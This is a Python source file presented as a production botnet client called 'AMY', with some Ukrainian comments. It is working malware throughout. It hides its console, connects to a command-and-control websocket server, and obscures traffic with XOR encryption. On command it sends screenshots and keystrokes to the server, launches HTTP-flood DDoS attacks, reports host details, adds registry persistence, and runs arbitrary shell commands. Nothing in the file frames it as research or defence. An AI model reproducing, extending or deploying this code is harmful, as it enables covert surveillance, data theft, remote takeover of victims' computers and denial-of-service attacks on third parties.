# ================================================
# AMY Botnet Client - Optimized Production Version
# ================================================

import asyncio
import websockets
import sys
import subprocess
import os
import time
import random
import base64
import io
import requests
import httpx
import uuid
import ctypes
import platform
import socket
from PIL import ImageGrab
from pynput import keyboard
from io import BytesIO

# ====================== CONFIGURATION ======================
SERVER_URL = "ws://192.168.10.82:8000/ws/" # ЗАМІНІТЬ ПРИ КОМПІЛЯЦІЇ
KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"

def get_bot_id():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1])
    return f"bot_{mac.replace(':', '')[:8]}"

# ====================== XOR ENCRYPTION ======================
def encrypt_message(msg: str) -> str:
    encrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(msg.encode('utf-8'))])
    return base64.b64encode(encrypted).decode('utf-8')

def decrypt_message(encoded: str) -> str:
    try:
        encrypted = base64.b64decode(encoded)
        decrypted = bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(encrypted)])
        return decrypted.decode('utf-8', errors='ignore')
    except:
        return encoded

# ====================== STEALTH & ANTI-ANALYSIS ======================
def hide_console():
    if sys.platform == "win32":
        hWnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hWnd != 0:
            ctypes.windll.user32.ShowWindow(hWnd, 0)

# ====================== MODULES ======================
async def http_flood(target_url, duration=60):
    start_time = time.time()
    count = 0
    async with httpx.AsyncClient() as client:
        while time.time() - start_time < duration:
            try:
                await client.get(target_url)
                count += 1
                if count % 50 == 0: await asyncio.sleep(0.01)
            except:
                pass
    return f"[DDoS] Finished. Sent {count} requests to {target_url}"

def get_system_report():
    report = f"--- SYSTEM REPORT ---\n"
    report += f"ID: {get_bot_id()}\n"
    report += f"OS: {platform.system()} {platform.release()}\n"
    report += f"Arch: {platform.machine()}\n"
    report += f"Hostname: {socket.gethostname()}\n"
    report += f"Internal IP: {socket.gethostbyname(socket.gethostname())}\n"
    # Перевірка наявності профілів
    if sys.platform == "win32":
        chrome = os.path.expanduser("~") + "\\AppData\\Local\\Google\\Chrome\\User Data"
        if os.path.exists(chrome): report += "[+] Chrome Profile Detected\n"
    return report

# ====================== MAIN BOT LOOP ======================
async def run_bot():
    bot_id = get_bot_id()
    full_url = f"{SERVER_URL}{bot_id}"
    
    while True:
        try:
            async with websockets.connect(full_url, origin=None) as websocket:
                print(f"[*] Bot {bot_id} online.")
                
                while True:
                    encrypted_command = await websocket.recv()
                    command = decrypt_message(encrypted_command)
                    
                    if not command: continue

                    if command == "screenshot":
                        screenshot = ImageGrab.grab()
                        buffered = BytesIO()
                        screenshot.save(buffered, format="PNG")
                        img_str = base64.b64encode(buffered.getvalue()).decode()
                        await websocket.send(encrypt_message(f"SCREENSHOT:{img_str}"))
                    
                    elif command.startswith("ddos "):
                        try:
                            _, url = command.split(" ", 1)
                            # Запуск в фоні, щоб не блокувати бот
                            asyncio.create_task(websocket.send(encrypt_message(f"[DDoS] Starting attack on {url}...")))
                            result = await http_flood(url)
                            await websocket.send(encrypt_message(result))
                        except:
                            await websocket.send(encrypt_message("[ERROR] Invalid DDoS syntax. Use: ddos http://target.com"))

                    elif command == "steal":
                        await websocket.send(encrypt_message(get_system_report()))
                    
                    elif command == "keylogger":
                        def on_press(key):
                            try: k = str(key.char)
                            except: k = f" [{str(key)}] "
                            asyncio.run_coroutine_threadsafe(websocket.send(encrypt_message(f"KEYLOG:{k}")), asyncio.get_event_loop())
                        listener = keyboard.Listener(on_press=on_press)
                        listener.start()
                        await websocket.send(encrypt_message("[SYSTEM] Keylogger started"))
                    
                    elif command == "persistence":
                        if sys.platform == "win32":
                            app_path = os.path.realpath(sys.executable)
                            subprocess.run(f'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "AmyBot" /t REG_SZ /d "{app_path}" /f', shell=True)
                            await websocket.send(encrypt_message("[SYSTEM] Persistence established (Registry)"))
                        else:
                            await websocket.send(encrypt_message("[SYSTEM] Persistence only supported on Windows"))
                    
                    else:
                        # Shell commands
                        try:
                            proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                            stdout, stderr = await proc.communicate()
                            output = (stdout.decode() + stderr.decode()).strip()
                            await websocket.send(encrypt_message(output or "[SYSTEM] Command executed."))
                        except Exception as e:
                            await websocket.send(encrypt_message(f"Error: {str(e)}"))

        except Exception as e:
            await asyncio.sleep(5)

if __name__ == "__main__":
    hide_console()
    asyncio.run(run_bot())